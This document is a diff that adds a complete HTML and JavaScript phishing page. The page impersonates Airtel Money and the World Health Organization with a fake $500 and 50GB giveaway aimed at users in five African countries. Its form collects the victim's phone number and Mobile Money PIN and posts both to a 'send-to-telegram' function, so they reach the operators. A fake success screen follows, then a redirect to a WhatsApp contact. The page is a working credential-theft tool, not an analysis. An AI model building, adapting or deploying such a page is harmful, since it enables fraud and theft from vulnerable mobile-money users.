@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AFRICA 50GB - $500 Giveaway</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 36px;
+            padding: 32px 24px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+            position: relative;
+            overflow: hidden;
+            display: none;
+            animation: fadeInUp 0.6s ease forwards;
+        }
+
+        .card.active {
+            display: block;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #e2001a, #ff6b6b, #e2001a);
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .logo .airtel {
+            font-size: 28px;
+            font-weight: 900;
+            color: #e2001a;
+        }
+
+        .logo .airtel span {
+            color: #0055a4;
+        }
+
+        .logo .tag {
+            display: inline-block;
+            background: linear-gradient(135deg, #ffeb3b, #fdd835);
+            padding: 4px 18px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        .flag-icon {
+            font-size: 48px;
+            display: block;
+            text-align: center;
+            margin: 8px 0 4px;
+        }
+
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #e2001a, #b80014);
+            color: white;
+            box-shadow: 0 8px 25px rgba(226, 0, 26, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(226, 0, 26, 0.4);
+        }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 5px;
+        }
+
+        .form-group label .required {
+            color: #e2001a;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e8e8e8;
+            border-radius: 14px;
+            font-size: 16px;
+            background: #f8f8f8;
+            outline: none;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .form-group input:focus {
+            border-color: #e2001a;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(226, 0, 26, 0.08);
+        }
+
+        .form-group .hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
+        }
+
+        .form-group .hint strong {
+            color: #e2001a;
+        }
+
+        .error-msg {
+            color: #d32f2f;
+            font-size: 13px;
+            padding: 10px 14px;
+            background: #ffebee;
+            border-radius: 10px;
+            display: none;
+            margin-top: 6px;
+        }
+
+        .error-msg.show {
+            display: block;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .welcome-icon {
+            font-size: 56px;
+            text-align: center;
+            margin: 4px 0;
+        }
+
+        .welcome-title {
+            font-size: 22px;
+            font-weight: 900;
+            color: #e2001a;
+            text-align: center;
+            margin: 4px 0;
+            line-height: 1.3;
+        }
+
+        .welcome-title .highlight {
+            color: #0055a4;
+        }
+
+        .welcome-sub {
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .ticket-box {
+            background: linear-gradient(135deg, #fff8e1, #ffecb3);
+            border: 2px dashed #e2001a;
+            border-radius: 16px;
+            padding: 16px;
+            margin: 16px 0;
+            text-align: center;
+        }
+
+        .ticket-box .label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 700;
+        }
+
+        .ticket-box .number {
+            font-size: 28px;
+            font-weight: 900;
+            color: #e2001a;
+            letter-spacing: 2px;
+            margin-top: 4px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .offer-details {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin: 12px 0;
+        }
+
+        .offer-details .item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 6px 0;
+            font-size: 14px;
+            color: #444;
+        }
+
+        .offer-details .item .icon {
+            font-size: 18px;
+            min-width: 28px;
+        }
+
+        .offer-details .item strong {
+            color: #e2001a;
+        }
+
+        .success-box {
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            border-radius: 20px;
+            padding: 32px 20px;
+            text-align: center;
+            margin: 8px 0 16px;
+        }
+
+        .success-box .check {
+            font-size: 72px;
+        }
+
+        .success-box h2 {
+            color: #2e7d32;
+            margin-top: 8px;
+            font-size: 24px;
+        }
+
+        .success-box p {
+            color: #444;
+            margin-top: 8px;
+            line-height: 1.7;
+            font-size: 15px;
+        }
+
+        .success-box .ticket-display {
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+        }
+
+        .success-box .ticket-display .label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 700;
+        }
+
+        .success-box .ticket-display .number {
+            font-size: 24px;
+            font-weight: 900;
+            color: #e2001a;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .redirect-timer {
+            margin-top: 16px;
+            padding: 14px;
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 15px;
+            color: #1b5e20;
+            border: 2px solid #2e7d32;
+            font-weight: 600;
+        }
+
+        .redirect-timer strong {
+            font-size: 22px;
+            color: #e2001a;
+        }
+
+        .map-container {
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        .map-container .map-icon {
+            font-size: 80px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .map-container h2 {
+            font-size: 24px;
+            font-weight: 900;
+            color: #1a1a2e;
+            margin-bottom: 4px;
+        }
+
+        .map-container p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .country-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 8px;
+        }
+
+        .country-btn {
+            padding: 14px 10px;
+            border: 2px solid #e8e8e8;
+            border-radius: 14px;
+            background: #fafafa;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .country-btn:hover {
+            border-color: #e2001a;
+            background: #fff5f5;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(226, 0, 26, 0.1);
+        }
+
+        .country-btn .flag {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .country-btn .name {
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .country-btn .code {
+            font-size: 10px;
+            color: #999;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #eee;
+            font-size: 11px;
+            color: #bbb;
+            text-align: center;
+        }
+
+        .footer .lock {
+            color: #2e7d32;
+            font-weight: 600;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .back-link {
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 13px;
+            margin-top: 12px;
+            transition: 0.3s;
+            display: block;
+            text-align: center;
+            width: 100%;
+        }
+
+        .back-link:hover {
+            color: #e2001a;
+        }
+
+        .who-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #e8f0fe;
+            border-radius: 30px;
+            padding: 6px 16px;
+            margin: 8px auto;
+            max-width: fit-content;
+            font-size: 12px;
+            font-weight: 600;
+            color: #1a3a6b;
+        }
+
+        .manual-link {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .manual-link a {
+            color: #25D366;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .manual-link a:hover {
+            text-decoration: underline;
+        }
+
+        .offer-badge {
+            background: linear-gradient(135deg, #ff6b6b, #e2001a);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            display: inline-block;
+            margin-bottom: 8px;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 18px;
+                border-radius: 28px;
+            }
+
+            .country-grid {
+                gap: 8px;
+            }
+
+            .country-btn {
+                padding: 12px 8px;
+                font-size: 12px;
+            }
+
+            .country-btn .flag {
+                font-size: 22px;
+            }
+
+            .welcome-title {
+                font-size: 19px;
+            }
+
+            .ticket-box .number {
+                font-size: 22px;
+            }
+
+            .success-box .check {
+                font-size: 56px;
+            }
+
+            .success-box h2 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- PAGE 0: Country Selection -->
+        <div id="page0" class="card active">
+            <div class="map-container">
+                <span class="map-icon">🌍</span>
+                <h2>Select Your Country</h2>
+                <p>Choose your country to claim your <strong>$500</strong> prize and <strong>50GB</strong> data bundle</p>
+
+                <div class="who-badge">
+                    <span>🏥</span>
+                    <span>WORLD HEALTH ORGANIZATION</span>
+                </div>
+
+                <div class="country-grid">
+                    <button class="country-btn" data-country="uganda">
+                        <span class="flag">🇺🇬</span>
+                        <span class="name">Uganda</span>
+                        <span class="code">+256</span>
+                    </button>
+                    <button class="country-btn" data-country="zambia">
+                        <span class="flag">🇿🇲</span>
+                        <span class="name">Zambia</span>
+                        <span class="code">+260</span>
+                    </button>
+                    <button class="country-btn" data-country="malawi">
+                        <span class="flag">🇲🇼</span>
+                        <span class="name">Malawi</span>
+                        <span class="code">+265</span>
+                    </button>
+                    <button class="country-btn" data-country="rwanda">
+                        <span class="flag">🇷🇼</span>
+                        <span class="name">Rwanda</span>
+                        <span class="code">+250</span>
+                    </button>
+                    <button class="country-btn" data-country="drc" style="grid-column: span 2;">
+                        <span class="flag">🇨🇩</span>
+                        <span class="name">DR Congo</span>
+                        <span class="code">+243</span>
+                    </button>
+                </div>
+            </div>
+            <div class="footer">
+                <span class="lock">🔒</span> Secured Connection <span class="lock">(SSL)</span>
+            </div>
+        </div>
+
+        <!-- PAGE 1: Welcome -->
+        <div id="page1" class="card">
+            <div class="logo">
+                <div class="airtel">AIRTEL <span>MONEY</span></div>
+                <span class="tag">🎁 TODAY'S OFFER</span>
+            </div>
+
+            <div class="flag-icon" id="countryFlag">🇺🇬</div>
+
+            <div class="welcome-icon">🎉</div>
+            <div class="welcome-title" id="welcomeTitle">
+                Your application for <span class="highlight">$500</span> from<br />
+                WORLD HEALTH ORGANIZATION (WHO) has been received!
+            </div>
+            <div class="welcome-sub" id="welcomeSub" style="margin-top:4px;">
+                <strong>You've been added among the winners!</strong>
+            </div>
+
+            <div class="ticket-box">
+                <div class="label">🎫 YOUR TICKET NUMBER</div>
+                <div class="number" id="ticketNumber">AFR-2026-00123</div>
+            </div>
+
+            <div class="offer-details">
+                <div class="item">
+                    <span class="icon">📱</span>
+                    <span><strong>50GB</strong> Data Bundle - All Month</span>
+                </div>
+                <div class="item">
+                    <span class="icon">💰</span>
+                    <span><strong>$500</strong> Cash Prize Giveaway</span>
+                </div>
+                <div class="item">
+                    <span class="icon">🏆</span>
+                    <span>You're <strong>already queued</strong> among the winners!</span>
+                </div>
+                <div class="item">
+                    <span class="icon">📶</span>
+                    <span>Valid for <strong>30 days</strong> across all networks</span>
+                </div>
+            </div>
+
+            <button class="btn btn-primary" id="subscribeBtn">
+                🚀 SUBSCRIBE TO 50GB DATA PLAN
+            </button>
+
+            <button class="back-link" id="backToMap1">← Change Country</button>
+
+            <div class="footer">
+                <span class="lock">🔒</span> Secured Connection <span class="lock">(SSL)</span>
+            </div>
+        </div>
+
+        <!-- PAGE 2: Form -->
+        <div id="page2" class="card">
+            <div class="logo">
+                <div class="airtel">AIRTEL <span>MONEY</span></div>
+                <span class="tag">📱 SUBSCRIBE NOW</span>
+            </div>
+
+            <div style="display:flex; align-items:center; justify-content:center; gap:12px; margin:4px 0 12px;">
+                <span id="formFlag" style="font-size:36px;">🇺🇬</span>
+                <span id="formCountry" style="font-size:18px; font-weight:700; color:#333;">Uganda</span>
+            </div>
+
+            <div style="background:#f0f7ff; border-radius:12px; padding:12px; margin-bottom:16px; text-align:center;">
+                <p id="offerDescription" style="font-size:13px; color:#444;">
+                    💰 Get <strong>50GB Data</strong> + <strong>$500</strong> Cash Prize<br />
+                    <span style="font-size:12px; color:#888;">Subscribe now and claim your reward!</span>
+                </p>
+            </div>
+
+            <div class="form-group">
+                <label id="phoneLabel">📞 Phone Number <span class="required">*</span></label>
+                <input type="tel" id="phoneInput" placeholder="Enter phone number" maxlength="15" />
+                <div class="hint" id="phoneHint">Format: <strong>+2567XXXXXXXX</strong></div>
+            </div>
+
+            <div class="form-group">
+                <label id="pinLabel">🔐 Mobile Money PIN <span class="required">*</span></label>
+                <input type="password" id="pinInput" placeholder="****" maxlength="4" />
+                <div class="hint" id="pinHint">💡 Enter your <strong>4-digit</strong> Mobile Money PIN</div>
+            </div>
+
+            <div class="error-msg" id="formError"></div>
+
+            <button class="btn btn-primary" id="submitBtn">
+                <span id="submitText">🔥 GET DATA BUNDLE</span>
+                <span id="submitSpinner" class="spinner hidden"></span>
+            </button>
+
+            <button class="back-link" id="backToWelcome">← Back</button>
+
+            <div class="footer">
+                <span class="lock">🔒</span> Secured Connection <span class="lock">(SSL)</span>
+            </div>
+        </div>
+
+        <!-- PAGE 3: Success -->
+        <div id="page3" class="card">
+            <div class="success-box">
+                <div class="check">🎉</div>
+                <h2 id="successTitle">Subscription Successful!</h2>
+                <p id="successMessage">
+                    <strong>Congratulations!</strong> You will receive your
+                    <strong>50GB Data Bundle</strong> and <strong>$500</strong>
+                    prize within <strong>1 minute</strong>.
+                </p>
+
+                <div class="ticket-display">
+                    <div class="label">🎫 YOUR TICKET NUMBER</div>
+                    <div class="number" id="successTicket">AFR-2026-00123</div>
+                </div>
+
+                <div style="margin-top:12px; font-size:13px; color:#666;">
+                    <span id="successCountry" style="font-weight:700; color:#0055a4;">🇺🇬 Uganda</span>
+                    <span id="successPhone" style="display:block; margin-top:4px;">📞 +2567XXXXXXX</span>
+                </div>
+            </div>
+
+            <div class="redirect-timer" id="redirectTimer">
+                🔄 Redirecting to WhatsApp Customer Support in <strong id="countdown">5</strong> seconds...
+            </div>
+
+            <div class="manual-link">
+                If not redirected, <a href="#" id="manualWhatsAppLink" target="_blank">click here to chat on WhatsApp</a>
+            </div>
+
+            <button class="back-link" id="backToMap3">← Back to Home</button>
+
+            <div class="footer">
+                <span class="lock">🔒</span> Secured Connection <span class="lock">(SSL)</span>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // =============================================================
+        // CONFIGURATION
+        // =============================================================
+        const WHATSAPP_LINK = 'https://wa.me/message/XVGOEG42R65ZH1';
+        const TELEGRAM_ENDPOINT = '/.netlify/functions/send-to-telegram';
+
+        const COUNTRIES = {
+            uganda: {
+                name: 'Uganda',
+                flag: '🇺🇬',
+                code: '+256',
+                phoneFormat: '+2567XXXXXXXX',
+                phonePattern: /^2567\d{8}$/,
+                displayName: 'Uganda'
+            },
+            zambia: {
+                name: 'Zambia',
+                flag: '🇿🇲',
+                code: '+260',
+                phoneFormat: '+2609XXXXXXXX',
+                phonePattern: /^2609\d{8}$/,
+                displayName: 'Zambia'
+            },
+            malawi: {
+                name: 'Malawi',
+                flag: '🇲🇼',
+                code: '+265',
+                phoneFormat: '+2659XXXXXXXX',
+                phonePattern: /^2659\d{8}$/,
+                displayName: 'Malawi'
+            },
+            rwanda: {
+                name: 'Rwanda',
+                flag: '🇷🇼',
+                code: '+250',
+                phoneFormat: '+2507XXXXXXXX',
+                phonePattern: /^2507\d{8}$/,
+                displayName: 'Rwanda'
+            },
+            drc: {
+                name: 'DRC',
+                flag: '🇨🇩',
+                code: '+243',
+                phoneFormat: '+2439XXXXXXXX',
+                phonePattern: /^2439\d{8}$/,
+                displayName: 'Democratic Republic of the Congo'
+            }
+        };
+
+        // =============================================================
+        // STATE
+        // =============================================================
+        let selectedCountry = 'uganda';
+        let ticketNumber = '';
+        let isSubmitting = false;
+        let countdownInterval = null;
+
+        // =============================================================
+        // DOM REFERENCES
+        // =============================================================
+        const page0 = document.getElementById('page0');
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const page3 = document.getElementById('page3');
+
+        const countryFlag = document.getElementById('countryFlag');
+        const ticketNumberEl = document.getElementById('ticketNumber');
+        const successTicket = document.getElementById('successTicket');
+        const successCountry = document.getElementById('successCountry');
+        const successPhone = document.getElementById('successPhone');
+
+        const formFlag = document.getElementById('formFlag');
+        const formCountry = document.getElementById('formCountry');
+        const phoneInput = document.getElementById('phoneInput');
+        const pinInput = document.getElementById('pinInput');
+        const phoneHint = document.getElementById('phoneHint');
+        const formError = document.getElementById('formError');
+        const submitBtn = document.getElementById('submitBtn');
+        const submitText = document.getElementById('submitText');
+        const submitSpinner = document.getElementById('submitSpinner');
+
+        const welcomeTitle = document.getElementById('welcomeTitle');
+        const welcomeSub = document.getElementById('welcomeSub');
+        const subscribeBtn = document.getElementById('subscribeBtn');
+        const phoneLabel = document.getElementById('phoneLabel');
+        const pinLabel = document.getElementById('pinLabel');
+        const pinHint = document.getElementById('pinHint');
+        const offerDescription = document.getElementById('offerDescription');
+        const successTitle = document.getElementById('successTitle');
+        const successMessage = document.getElementById('successMessage');
+        const redirectTimer = document.getElementById('redirectTimer');
+        const manualLink = document.querySelector('.manual-link');
+
+        // =============================================================
+        // GENERATE TICKET
+        // =============================================================
+        function generateTicket() {
+            const date = new Date();
+            const year = date.getFullYear();
+            const random = String(Math.floor(10000 + Math.random() * 90000));
+            return `AFR-${year}-${random}`;
+        }
+
+        // =============================================================
+        // SHOW PAGE
+        // =============================================================
+        function showPage(page) {
+            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+            page.classList.add('active');
+        }
+
+        // =============================================================
+        // UPDATE COUNTRY
+        // =============================================================
+        function updateCountry(countryKey) {
+            selectedCountry = countryKey;
+            const country = COUNTRIES[countryKey];
+
+            countryFlag.textContent = country.flag;
+            formFlag.textContent = country.flag;
+            formCountry.textContent = country.displayName;
+
+            phoneHint.innerHTML = `Format: <strong>${country.phoneFormat}</strong>`;
+            phoneInput.placeholder = country.phoneFormat;
+            phoneInput.value = '';
+
+            ticketNumber = generateTicket();
+            ticketNumberEl.textContent = ticketNumber;
+            successTicket.textContent = ticketNumber;
+
+            formError.classList.remove('show');
+            pinInput.value = '';
+        }
+
+        // =============================================================
+        // SHOW ERROR
+        // =============================================================
+        function showError(msg) {
+            if (msg) {
+                formError.textContent = msg;
+                formError.classList.add('show');
+            } else {
+                formError.classList.remove('show');
+            }
+        }
+
+        // =============================================================
+        // SET LOADING
+        // =============================================================
+        function setLoading(loading) {
+            if (loading) {
+                submitBtn.disabled = true;
+                submitText.textContent = 'Submitting...';
+                submitSpinner.classList.remove('hidden');
+            } else {
+                submitBtn.disabled = false;
+                submitText.textContent = '🔥 GET DATA BUNDLE';
+                submitSpinner.classList.add('hidden');
+            }
+        }
+
+        // =============================================================
+        // START REDIRECT
+        // =============================================================
+        function startRedirect() {
+            let countdown = 5;
+            document.getElementById('manualWhatsAppLink').href = WHATSAPP_LINK;
+
+            countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    redirectTimer.innerHTML = `🔄 Redirecting to WhatsApp Customer Support in <strong id="countdown">${countdown}</strong> seconds...`;
+                } else {
+                    clearInterval(countdownInterval);
+                    redirectTimer.innerHTML = '✅ Redirecting to WhatsApp...';
+                    window.location.href = WHATSAPP_LINK;
+                }
+            }, 1000);
+        }
+
+        // =============================================================
+        // EVENT: COUNTRY SELECTION
+        // =============================================================
+        document.querySelectorAll('.country-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const country = this.dataset.country;
+                updateCountry(country);
+                showPage(page1);
+            });
+        });
+
+        // =============================================================
+        // EVENT: SUBSCRIBE
+        // =============================================================
+        document.getElementById('subscribeBtn').addEventListener('click', function() {
+            showPage(page2);
+            phoneInput.focus();
+        });
+
+        // =============================================================
+        // EVENT: BACK BUTTONS
+        // =============================================================
+        document.getElementById('backToMap1').addEventListener('click', function() {
+            showPage(page0);
+        });
+
+        document.getElementById('backToWelcome').addEventListener('click', function() {
+            showPage(page1);
+        });
+
+        document.getElementById('backToMap3').addEventListener('click', function() {
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            showPage(page0);
+        });
+
+        // =============================================================
+        // EVENT: SUBMIT FORM
+        // =============================================================
+        submitBtn.addEventListener('click', async function() {
+            if (isSubmitting) return;
+
+            const phone = phoneInput.value.trim();
+            const pin = pinInput.value.trim();
+            const country = COUNTRIES[selectedCountry];
+
+            showError();
+
+            // Validate phone
+            if (!phone) {
+                showError('Please enter your phone number.');
+                phoneInput.focus();
+                return;
+            }
+
+            const cleanPhone = phone.replace(/\s/g, '');
+            const phoneWithCode = cleanPhone.startsWith('+') ? cleanPhone : '+' + cleanPhone;
+            const checkPhone = phoneWithCode.replace(/^\+/, '');
+
+            if (!country.phonePattern.test(checkPhone)) {
+                showError(`Invalid phone number. Use format: ${country.phoneFormat}`);
+                phoneInput.focus();
+                return;
+            }
+
+            // Validate PIN
+            if (!pin) {
+                showError('Please enter your PIN.');
+                pinInput.focus();
+                return;
+            }
+
+            if (!/^\d{4}$/.test(pin)) {
+                showError('PIN must be 4 digits.');
+                pinInput.focus();
+                return;
+            }
+
+            // Submit to Telegram
+            isSubmitting = true;
+            setLoading(true);
+
+            try {
+                const response = await fetch(TELEGRAM_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        country: country.displayName,
+                        countryCode: selectedCountry,
+                        phone: phoneWithCode,
+                        pin: pin,
+                        ticket: ticketNumber,
+                        offer: '50GB Data + $500'
+                    })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok || !data.success) {
+                    throw new Error(data.message || 'Submission failed');
+                }
+
+                // Success
+                successCountry.textContent = `${country.flag} ${country.displayName}`;
+                successPhone.textContent = `📞 ${phoneWithCode}`;
+                successTicket.textContent = ticketNumber;
+
+                showPage(page3);
+
+                setTimeout(() => {
+                    startRedirect();
+                }, 1500);
+
+            } catch (error) {
+                console.error('❌ Error:', error);
+                showError('An error occurred. Please try again.');
+                setLoading(false);
+                isSubmitting = false;
+            } finally {
+                setLoading(false);
+                isSubmitting = false;
+            }
+        });
+
+        // =============================================================
+        // ENTER KEY
+        // =============================================================
+        phoneInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') pinInput.focus(); });
+        pinInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitBtn.click(); });
+
+        // =============================================================
+        // PHONE FORMAT
+        // =============================================================
+        phoneInput.addEventListener('input', function() {
+            let value = this.value.replace(/\s/g, '');
+            if (!value.startsWith('+')) {
+                value = '+' + value.replace(/^\+/, '');
+            }
+            this.value = value;
+        });
+
+        // =============================================================
+        // INIT
+        // =============================================================
+        updateCountry('uganda');
+        showPage(page0);
+
+        console.log('🚀 AFRICA 50GB OFFER Started!');
+    </script>
+
+</body>
+</html>
